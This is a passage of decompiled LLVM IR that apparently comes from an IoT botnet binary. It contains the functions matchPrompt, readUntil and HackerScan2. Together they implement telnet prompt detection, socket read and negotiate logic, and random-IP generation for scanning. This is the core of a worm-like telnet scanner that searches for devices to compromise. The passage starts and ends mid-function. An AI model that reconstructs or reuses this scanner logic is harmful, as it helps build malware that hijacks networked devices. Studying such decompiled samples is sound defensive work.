  %v4_a2d4 = inttoptr i32 %v1_a2c0 to i32*
  %v5_a2d4 = call i32 @__libc_send(i32 %arg1, i32* %v4_a2d4, i32 1, i32 16384)
  br label %dec_label_pc_a2e0

dec_label_pc_a2e0:                                ; preds = %dec_label_pc_a1a8, %dec_label_pc_a2a4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a2e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a2a4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a298, { 1, 0 }
  uselistorder label %dec_label_pc_a260, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a310 = call i32 @strlen(i8* %arg1)
  %v2_a358 = add i32 %v3_a310, %tmp
  br label %dec_label_pc_a42c

dec_label_pc_a330:                                ; preds = %dec_label_pc_a3b8, %dec_label_pc_a394, %dec_label_pc_a370, %dec_label_pc_a34c
  %v1_a334 = add nsw i32 %stack_var_-24.013, 1
  %v7_a348 = icmp sgt i32 %v3_a310, %v1_a334
  br i1 %v7_a348, label %dec_label_pc_a34c, label %dec_label_pc_a3dc

dec_label_pc_a34c:                                ; preds = %dec_label_pc_a33c.preheader, %dec_label_pc_a330
  %stack_var_-24.013 = phi i32 [ %v1_a334, %dec_label_pc_a330 ], [ %stack_var_-24.1, %dec_label_pc_a33c.preheader ]
  %v2_a360 = sub i32 %v2_a358, %stack_var_-24.013
  %v1_a364 = inttoptr i32 %v2_a360 to i8*
  %v2_a364 = load i8, i8* %v1_a364, align 1
  %v2_a368 = icmp eq i8 %v2_a364, 0
  br i1 %v2_a368, label %dec_label_pc_a330, label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %dec_label_pc_a34c
  %v2_a388 = load i8, i8* %v1_a364, align 1
  %v7_a38c = icmp eq i8 %v2_a388, 32
  br i1 %v7_a38c, label %dec_label_pc_a330, label %dec_label_pc_a394

dec_label_pc_a394:                                ; preds = %dec_label_pc_a370
  %v2_a3ac = load i8, i8* %v1_a364, align 1
  %v7_a3b0 = icmp eq i8 %v2_a3ac, 13
  br i1 %v7_a3b0, label %dec_label_pc_a330, label %dec_label_pc_a3b8

dec_label_pc_a3b8:                                ; preds = %dec_label_pc_a394
  %v2_a3d0 = load i8, i8* %v1_a364, align 1
  %v7_a3d4 = icmp eq i8 %v2_a3d0, 10
  br i1 %v7_a3d4, label %dec_label_pc_a330, label %dec_label_pc_a3dc

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3b8, %dec_label_pc_a330, %dec_label_pc_a33c.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a33c.preheader ], [ %stack_var_-24.013, %dec_label_pc_a3b8 ], [ %v1_a334, %dec_label_pc_a330 ]
  %v2_a3f0 = sub i32 %v2_a358, %stack_var_-24.0.lcssa
  %v1_a3f4 = inttoptr i32 %v2_a3f0 to i8*
  %v2_a3f4 = load i8, i8* %v1_a3f4, align 1
  %v2_a404 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1c3fc.65 to i32)
  %v1_a408 = inttoptr i32 %v2_a404 to i8*
  %v2_a408 = load i8, i8* %v1_a408, align 1
  %v9_a40c = icmp eq i8 %v2_a3f4, %v2_a408
  %v1_a424 = add i32 %storemerge2, 1
  br i1 %v9_a40c, label %dec_label_pc_a44c, label %dec_label_pc_a42c

dec_label_pc_a42c:                                ; preds = %dec_label_pc_a3dc, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a3dc ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a424, %dec_label_pc_a3dc ]
  %v3_a434 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c3fc.65, i32 0, i32 0))
  %v3_a43c = icmp ult i32 %storemerge2, %v3_a434
  br i1 %v3_a43c, label %dec_label_pc_a33c.preheader, label %dec_label_pc_a44c

dec_label_pc_a33c.preheader:                      ; preds = %dec_label_pc_a42c
  %v7_a34812 = icmp sgt i32 %v3_a310, %stack_var_-24.1
  br i1 %v7_a34812, label %dec_label_pc_a34c, label %dec_label_pc_a3dc

dec_label_pc_a44c:                                ; preds = %dec_label_pc_a42c, %dec_label_pc_a3dc
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a3dc ], [ 0, %dec_label_pc_a42c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a310, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a3dc, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a464 = load i32, i32* @fp, align 4
  store i32 %v3_a464, i32* %stack_var_-16, align 4
  %v13_a464 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a4b4 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a4f4 = udiv i32 %arg1, 32
  %v3_a500 = mul nuw nsw i32 %v3_a4f4, 4
  %v1_a518 = urem i32 %arg1, 32
  %v6_a520 = shl i32 1, %v1_a518
  %v1_a544 = add i32 %arg1, 1
  %v2_a54c = ptrtoint i32* %stack_var_-176 to i32
  %v6_a66c = inttoptr i32 %arg2 to i8*
  %v2_a680 = icmp eq i32 %arg3, 0
  %v1_a68c = inttoptr i32 %arg6 to i8*
  %v5_a6d0 = icmp sgt i32 %arg5, 0
  %v2_a508 = add nsw i32 %v3_a500, -152
  %v2_a50c = add i32 %v2_a508, %v13_a464
  %v1_a510 = inttoptr i32 %v2_a50c to i32*
  br label %dec_label_pc_a6a8

dec_label_pc_a4c8.lr.ph:                          ; preds = %dec_label_pc_a6bc, %dec_label_pc_a6c8
  br label %dec_label_pc_a4c8

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a4c8.lr.ph, %dec_label_pc_a4c8
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a4c8.lr.ph ], [ %v1_a4dc, %dec_label_pc_a4c8 ]
  %v5_a4d4 = mul nuw nsw i32 %storemerge27, 4
  %v6_a4d4 = add i32 %v5_a4d4, %v2_a4b4
  %v7_a4d4 = inttoptr i32 %v6_a4d4 to i32*
  store i32 0, i32* %v7_a4d4, align 4
  %v1_a4dc = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a4dc, 32
  br i1 %tmp30, label %dec_label_pc_a4c8, label %dec_label_pc_a4f0

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a4c8
  %v2_a510 = load i32, i32* %v1_a510, align 4
  %v2_a524 = or i32 %v2_a510, %v6_a520
  store i32 %v2_a524, i32* %v1_a510, align 4
  %v5_a560 = call i32 @__libc_select(i32 %v1_a544, i32 %v2_a4b4, i32 0, i32 0, i32 %v2_a54c)
  %tmp31 = icmp slt i32 %v5_a560, 1
  br i1 %tmp31, label %dec_label_pc_a6ec, label %dec_label_pc_a570

dec_label_pc_a570:                                ; preds = %dec_label_pc_a4f0
  %v2_a57c = add i32 %stack_var_-40.0, %arg6
  %v5_a580 = inttoptr i32 %v2_a57c to i8*
  %v6_a594 = inttoptr i32 %v2_a57c to i32*
  %v7_a594 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a594, i32 1, i32 0, i32 %v2_a57c)
  %v7_a5a4 = icmp eq i32 %v7_a594, -1
  br i1 %v7_a5a4, label %dec_label_pc_a5b8, label %dec_label_pc_a5ac

dec_label_pc_a5ac:                                ; preds = %dec_label_pc_a570
  %v2_a5b0 = icmp eq i32 %v7_a594, 0
  br i1 %v2_a5b0, label %dec_label_pc_a5b8, label %dec_label_pc_a5c4

dec_label_pc_a5b8:                                ; preds = %dec_label_pc_a5ac, %dec_label_pc_a570
  br label %dec_label_pc_a6f4

dec_label_pc_a5c4:                                ; preds = %dec_label_pc_a5ac
  %v2_a5cc = add i32 %v7_a594, %stack_var_-40.0
  %v2_a5d8 = load i8, i8* %v5_a580, align 1
  %v2_a5dc = icmp eq i8 %v2_a5d8, -1
  br i1 %v2_a5dc, label %dec_label_pc_a5e4, label %dec_label_pc_a664

dec_label_pc_a5e4:                                ; preds = %dec_label_pc_a5c4
  %v1_a5e8 = add i32 %v2_a57c, 1
  %v5_a5fc = inttoptr i32 %v1_a5e8 to i32*
  %v6_a5fc = call i32 @__libc_recv(i32 %arg1, i32* %v5_a5fc, i32 2, i32 0, i32 %v2_a5cc)
  %v7_a60c = icmp eq i32 %v6_a5fc, -1
  br i1 %v7_a60c, label %dec_label_pc_a620, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5e4
  %v2_a618 = icmp eq i32 %v6_a5fc, 0
  br i1 %v2_a618, label %dec_label_pc_a620, label %dec_label_pc_a62c

dec_label_pc_a620:                                ; preds = %dec_label_pc_a614, %dec_label_pc_a5e4
  br label %dec_label_pc_a6f4

dec_label_pc_a62c:                                ; preds = %dec_label_pc_a614
  %v2_a634 = add i32 %v6_a5fc, %v2_a5cc
  %v3_a648 = call i32 @negotiate(i32 %arg1, i32 %v2_a57c, i32 3)
  %v2_a650 = icmp eq i32 %v3_a648, 0
  br i1 %v2_a650, label %dec_label_pc_a658, label %dec_label_pc_a6a8

dec_label_pc_a658:                                ; preds = %dec_label_pc_a62c
  br label %dec_label_pc_a6f4

dec_label_pc_a664:                                ; preds = %dec_label_pc_a5c4
  %v7_a66c = call i32 @strstr(i32 %arg6, i8* %v6_a66c)
  %v2_a674 = icmp eq i32 %v7_a66c, 0
  br i1 %v2_a674, label %dec_label_pc_a67c, label %dec_label_pc_a6e0

dec_label_pc_a67c:                                ; preds = %dec_label_pc_a664
  br i1 %v2_a680, label %dec_label_pc_a6a8, label %dec_label_pc_a688

dec_label_pc_a688:                                ; preds = %dec_label_pc_a67c
  %v2_a68c = call i32 @matchPrompt(i8* %v1_a68c)
  %v2_a694 = icmp eq i32 %v2_a68c, 0
  br i1 %v2_a694, label %dec_label_pc_a6a8, label %dec_label_pc_a6e0

dec_label_pc_a6a8:                                ; preds = %dec_label_pc_a62c, %dec_label_pc_a688, %dec_label_pc_a67c, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a634, %dec_label_pc_a62c ], [ %v2_a5cc, %dec_label_pc_a67c ], [ %v2_a5cc, %dec_label_pc_a688 ]
  %v1_a6ac = add i32 %stack_var_-40.0, 2
  %v6_a6b8 = icmp slt i32 %v1_a6ac, %arg7
  br i1 %v6_a6b8, label %dec_label_pc_a6bc, label %dec_label_pc_a6ec

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a6a8
  %v3_a6bc = load i32, i32* %stack_var_-176, align 4
  %v5_a6c4 = icmp sgt i32 %v3_a6bc, 0
  br i1 %v5_a6c4, label %dec_label_pc_a4c8.lr.ph, label %dec_label_pc_a6c8

dec_label_pc_a6c8:                                ; preds = %dec_label_pc_a6bc
  br i1 %v5_a6d0, label %dec_label_pc_a4c8.lr.ph, label %dec_label_pc_a6ec

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a664, %dec_label_pc_a688
  br label %dec_label_pc_a6f4

dec_label_pc_a6ec:                                ; preds = %dec_label_pc_a4f0, %dec_label_pc_a6c8, %dec_label_pc_a6a8
  br label %dec_label_pc_a6f4

dec_label_pc_a6f4:                                ; preds = %dec_label_pc_a6e0, %dec_label_pc_a658, %dec_label_pc_a620, %dec_label_pc_a5b8, %dec_label_pc_a6ec
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a6ec ], [ 1, %dec_label_pc_a6e0 ], [ 0, %dec_label_pc_a5b8 ], [ 0, %dec_label_pc_a620 ], [ 0, %dec_label_pc_a658 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a5fc, { 1, 2, 0 }
  uselistorder i32 %v7_a594, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a4b4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a6f4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a6ec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a6e0, { 1, 0 }
  uselistorder label %dec_label_pc_a6a8, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a4c8, { 1, 0 }
  uselistorder label %dec_label_pc_a4c8.lr.ph, { 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a708 = load i32, i32* @fp, align 4
  store i32 42768, i32* %stack_var_-4, align 4
  %v2_a70c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a70c, i32* @fp, align 4
  %v2_a710 = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* @global_var_28c57.68, align 1
  store i8 0, i8* @global_var_28c58.69, align 1
  store i8 0, i8* @global_var_28c59.70, align 1
  store i8 0, i8* @global_var_28c5a.71, align 1
  %v0_a744 = call i32 @random()
  %v2_a754 = srem i32 %v0_a744, 255
  %v1_a764 = trunc i32 %v2_a754 to i8
  store i8 %v1_a764, i8* @global_var_28c57.68, align 1
  %v0_a768 = call i32 @random()
  %v2_a778 = srem i32 %v0_a768, 255
  %v1_a788 = trunc i32 %v2_a778 to i8
  store i8 %v1_a788, i8* @global_var_28c58.69, align 1
  %v0_a78c = call i32 @random()
  %v2_a79c = srem i32 %v0_a78c, 255
  %v1_a7ac = trunc i32 %v2_a79c to i8
  store i8 %v1_a7ac, i8* @global_var_28c59.70, align 1
  %v0_a7b0 = call i32 @random()
  %v2_a7c0 = srem i32 %v0_a7b0, 255
  %v1_a7d0 = trunc i32 %v2_a7c0 to i8
  store i8 %v1_a7d0, i8* @global_var_28c5a.71, align 1
  %v0_a7d4 = call i32 @random()
  %v2_a7e4 = srem i32 %v0_a7d4, 208
  %v2_a7f4 = icmp eq i32 %v2_a7e4, 0
  br i1 %v2_a7f4, label %dec_label_pc_a7fc, label %dec_label_pc_a824

dec_label_pc_a7fc:                                ; preds = %entry
  %v3_a808 = load i8, i8* @global_var_28c59.70, align 1
  %v3_a814 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a820 = sext i8 %v3_a808 to i32
  %v6_a820 = sext i8 %v3_a814 to i32
  %v8_a820 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c404.73 to i32), i32 %v4_a820, i32 %v6_a820, i32 0)
  br label %dec_label_pc_a824

dec_label_pc_a824:                                ; preds = %entry, %dec_label_pc_a7fc
  %v7_a828 = icmp eq i32 %v2_a7e4, 1
  br i1 %v7_a828, label %dec_label_pc_a830, label %dec_label_pc_a858

dec_label_pc_a830:                                ; preds = %dec_label_pc_a824
  %v3_a83c = load i8, i8* @global_var_28c59.70, align 1
  %v3_a848 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a854 = sext i8 %v3_a83c to i32
  %v6_a854 = sext i8 %v3_a848 to i32
  %v8_a854 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1c410.75 to i32), i32 %v4_a854, i32 %v6_a854, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a858

dec_label_pc_a858:                                ; preds = %dec_label_pc_a824, %dec_label_pc_a830
  %v7_a85c = icmp eq i32 %v2_a7e4, 2
  br i1 %v7_a85c, label %dec_label_pc_a864, label %dec_label_pc_a88c

dec_label_pc_a864:                                ; preds = %dec_label_pc_a858
  %v3_a870 = load i8, i8* @global_var_28c59.70, align 1
  %v3_a87c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a888 = sext i8 %v3_a870 to i32
  %v6_a888 = sext i8 %v3_a87c to i32
  %v8_a888 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1c420.77 to i32), i32 %v4_a888, i32 %v6_a888, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a88c

dec_label_pc_a88c:                                ; preds = %dec_label_pc_a858, %dec_label_pc_a864
  %v7_a890 = icmp eq i32 %v2_a7e4, 3
  br i1 %v7_a890, label %dec_label_pc_a898, label %dec_label_pc_a8c0

dec_label_pc_a898:                                ; preds = %dec_label_pc_a88c
  %v3_a8a4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_a8b0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a8bc = sext i8 %v3_a8a4 to i32
  %v6_a8bc = sext i8 %v3_a8b0 to i32
  %v8_a8bc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c42c.79 to i32), i32 %v4_a8bc, i32 %v6_a8bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a8c0

dec_label_pc_a8c0:                                ; preds = %dec_label_pc_a88c, %dec_label_pc_a898
  %v7_a8c4 = icmp eq i32 %v2_a7e4, 4
  br i1 %v7_a8c4, label %dec_label_pc_a8cc, label %dec_label_pc_a8f4

dec_label_pc_a8cc:                                ; preds = %dec_label_pc_a8c0
  %v3_a8d8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_a8e4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a8f0 = sext i8 %v3_a8d8 to i32
  %v6_a8f0 = sext i8 %v3_a8e4 to i32
  %v8_a8f0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1c43c.81 to i32), i32 %v4_a8f0, i32 %v6_a8f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a8f4

dec_label_pc_a8f4:                                ; preds = %dec_label_pc_a8c0, %dec_label_pc_a8cc
  %v7_a8f8 = icmp eq i32 %v2_a7e4, 5
  br i1 %v7_a8f8, label %dec_label_pc_a900, label %dec_label_pc_a928

dec_label_pc_a900:                                ; preds = %dec_label_pc_a8f4
  %v3_a90c = load i8, i8* @global_var_28c59.70, align 1
  %v3_a918 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a924 = sext i8 %v3_a90c to i32
  %v6_a924 = sext i8 %v3_a918 to i32
  %v8_a924 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c448.83 to i32), i32 %v4_a924, i32 %v6_a924, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a928

dec_label_pc_a928:                                ; preds = %dec_label_pc_a8f4, %dec_label_pc_a900
  %v7_a92c = icmp eq i32 %v2_a7e4, 6
  br i1 %v7_a92c, label %dec_label_pc_a934, label %dec_label_pc_a95c

dec_label_pc_a934:                                ; preds = %dec_label_pc_a928
  %v3_a940 = load i8, i8* @global_var_28c59.70, align 1
  %v3_a94c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a958 = sext i8 %v3_a940 to i32
  %v6_a958 = sext i8 %v3_a94c to i32
  %v8_a958 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([12 x i8]* @global_var_1c458.85 to i32), i32 %v4_a958, i32 %v6_a958, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a95c

dec_label_pc_a95c:                                ; preds = %dec_label_pc_a928, %dec_label_pc_a934
  %v7_a960 = icmp eq i32 %v2_a7e4, 7
  br i1 %v7_a960, label %dec_label_pc_a968, label %dec_label_pc_a990

dec_label_pc_a968:                                ; preds = %dec_label_pc_a95c
  %v3_a974 = load i8, i8* @global_var_28c59.70, align 1
  %v3_a980 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a98c = sext i8 %v3_a974 to i32
  %v6_a98c = sext i8 %v3_a980 to i32
  %v8_a98c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c464.87 to i32), i32 %v4_a98c, i32 %v6_a98c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a990

dec_label_pc_a990:                                ; preds = %dec_label_pc_a95c, %dec_label_pc_a968
  %v7_a994 = icmp eq i32 %v2_a7e4, 8
  br i1 %v7_a994, label %dec_label_pc_a99c, label %dec_label_pc_a9c4

dec_label_pc_a99c:                                ; preds = %dec_label_pc_a990
  %v3_a9a8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_a9b4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a9c0 = sext i8 %v3_a9a8 to i32
  %v6_a9c0 = sext i8 %v3_a9b4 to i32
  %v8_a9c0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c474.89 to i32), i32 %v4_a9c0, i32 %v6_a9c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9c4

dec_label_pc_a9c4:                                ; preds = %dec_label_pc_a990, %dec_label_pc_a99c
  %v7_a9c8 = icmp eq i32 %v2_a7e4, 9
  br i1 %v7_a9c8, label %dec_label_pc_a9d0, label %dec_label_pc_a9f8

dec_label_pc_a9d0:                                ; preds = %dec_label_pc_a9c4
  %v3_a9dc = load i8, i8* @global_var_28c59.70, align 1
  %v3_a9e8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_a9f4 = sext i8 %v3_a9dc to i32
  %v6_a9f4 = sext i8 %v3_a9e8 to i32
  %v8_a9f4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c484.91 to i32), i32 %v4_a9f4, i32 %v6_a9f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_a9c4, %dec_label_pc_a9d0
  %v7_a9fc = icmp eq i32 %v2_a7e4, 10
  br i1 %v7_a9fc, label %dec_label_pc_aa04, label %dec_label_pc_aa2c

dec_label_pc_aa04:                                ; preds = %dec_label_pc_a9f8
  %v3_aa10 = load i8, i8* @global_var_28c59.70, align 1
  %v3_aa1c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_aa28 = sext i8 %v3_aa10 to i32
  %v6_aa28 = sext i8 %v3_aa1c to i32
  %v8_aa28 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([14 x i8]* @global_var_1c494.93 to i32), i32 %v4_aa28, i32 %v6_aa28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa2c

dec_label_pc_aa2c:                                ; preds = %dec_label_pc_a9f8, %dec_label_pc_aa04
  %v7_aa30 = icmp eq i32 %v2_a7e4, 11
  br i1 %v7_aa30, label %dec_label_pc_aa38, label %dec_label_pc_aa60

dec_label_pc_aa38:                                ; preds = %dec_label_pc_aa2c
  %v3_aa44 = load i8, i8* @global_var_28c59.70, align 1
  %v3_aa50 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_aa5c = sext i8 %v3_aa44 to i32
  %v6_aa5c = sext i8 %v3_aa50 to i32
  %v8_aa5c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([11 x i8]* @global_var_1c4a4.95 to i32), i32 %v4_aa5c, i32 %v6_aa5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa60

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa2c, %dec_label_pc_aa38
  %v7_aa64 = icmp eq i32 %v2_a7e4, 12
  br i1 %v7_aa64, label %dec_label_pc_aa6c, label %dec_label_pc_aa94

dec_label_pc_aa6c:                                ; preds = %dec_label_pc_aa60
  %v3_aa78 = load i8, i8* @global_var_28c59.70, align 1
  %v3_aa84 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_aa90 = sext i8 %v3_aa78 to i32
  %v6_aa90 = sext i8 %v3_aa84 to i32
  %v8_aa90 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c4b0.97 to i32), i32 %v4_aa90, i32 %v6_aa90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa94

dec_label_pc_aa94:                                ; preds = %dec_label_pc_aa60, %dec_label_pc_aa6c
  %v7_aa98 = icmp eq i32 %v2_a7e4, 13
  br i1 %v7_aa98, label %dec_label_pc_aaa0, label %dec_label_pc_aac8

dec_label_pc_aaa0:                                ; preds = %dec_label_pc_aa94
  %v3_aaac = load i8, i8* @global_var_28c59.70, align 1
  %v3_aab8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_aac4 = sext i8 %v3_aaac to i32
  %v6_aac4 = sext i8 %v3_aab8 to i32
  %v8_aac4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c4c0.99 to i32), i32 %v4_aac4, i32 %v6_aac4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aac8

dec_label_pc_aac8:                                ; preds = %dec_label_pc_aa94, %dec_label_pc_aaa0
  %v7_aacc = icmp eq i32 %v2_a7e4, 14
  br i1 %v7_aacc, label %dec_label_pc_aad4, label %dec_label_pc_aafc

dec_label_pc_aad4:                                ; preds = %dec_label_pc_aac8
  %v3_aae0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_aaec = load i8, i8* @global_var_28c5a.71, align 1
  %v4_aaf8 = sext i8 %v3_aae0 to i32
  %v6_aaf8 = sext i8 %v3_aaec to i32
  %v8_aaf8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c4d0.101 to i32), i32 %v4_aaf8, i32 %v6_aaf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aafc

dec_label_pc_aafc:                                ; preds = %dec_label_pc_aac8, %dec_label_pc_aad4
  %v7_ab00 = icmp eq i32 %v2_a7e4, 15
  br i1 %v7_ab00, label %dec_label_pc_ab08, label %dec_label_pc_ab30

dec_label_pc_ab08:                                ; preds = %dec_label_pc_aafc
  %v3_ab14 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ab20 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ab2c = sext i8 %v3_ab14 to i32
  %v6_ab2c = sext i8 %v3_ab20 to i32
  %v8_ab2c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c4e0.103 to i32), i32 %v4_ab2c, i32 %v6_ab2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_aafc, %dec_label_pc_ab08
  %v7_ab34 = icmp eq i32 %v2_a7e4, 16
  br i1 %v7_ab34, label %dec_label_pc_ab3c, label %dec_label_pc_ab64

dec_label_pc_ab3c:                                ; preds = %dec_label_pc_ab30
  %v3_ab48 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ab54 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ab60 = sext i8 %v3_ab48 to i32
  %v6_ab60 = sext i8 %v3_ab54 to i32
  %v8_ab60 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c4f0.105 to i32), i32 %v4_ab60, i32 %v6_ab60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab64

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab30, %dec_label_pc_ab3c
  %v7_ab68 = icmp eq i32 %v2_a7e4, 17
  br i1 %v7_ab68, label %dec_label_pc_ab70, label %dec_label_pc_ab98

dec_label_pc_ab70:                                ; preds = %dec_label_pc_ab64
  %v3_ab7c = load i8, i8* @global_var_28c59.70, align 1
  %v3_ab88 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ab94 = sext i8 %v3_ab7c to i32
  %v6_ab94 = sext i8 %v3_ab88 to i32
  %v8_ab94 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c500.107 to i32), i32 %v4_ab94, i32 %v6_ab94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab98

dec_label_pc_ab98:                                ; preds = %dec_label_pc_ab64, %dec_label_pc_ab70
  %v7_ab9c = icmp eq i32 %v2_a7e4, 18
  br i1 %v7_ab9c, label %dec_label_pc_aba4, label %dec_label_pc_abcc

dec_label_pc_aba4:                                ; preds = %dec_label_pc_ab98
  %v3_abb0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_abbc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_abc8 = sext i8 %v3_abb0 to i32
  %v6_abc8 = sext i8 %v3_abbc to i32
  %v8_abc8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c510.109 to i32), i32 %v4_abc8, i32 %v6_abc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abcc

dec_label_pc_abcc:                                ; preds = %dec_label_pc_ab98, %dec_label_pc_aba4
  %v7_abd0 = icmp eq i32 %v2_a7e4, 19
  br i1 %v7_abd0, label %dec_label_pc_abd8, label %dec_label_pc_ac00

dec_label_pc_abd8:                                ; preds = %dec_label_pc_abcc
  %v3_abe4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_abf0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_abfc = sext i8 %v3_abe4 to i32
  %v6_abfc = sext i8 %v3_abf0 to i32
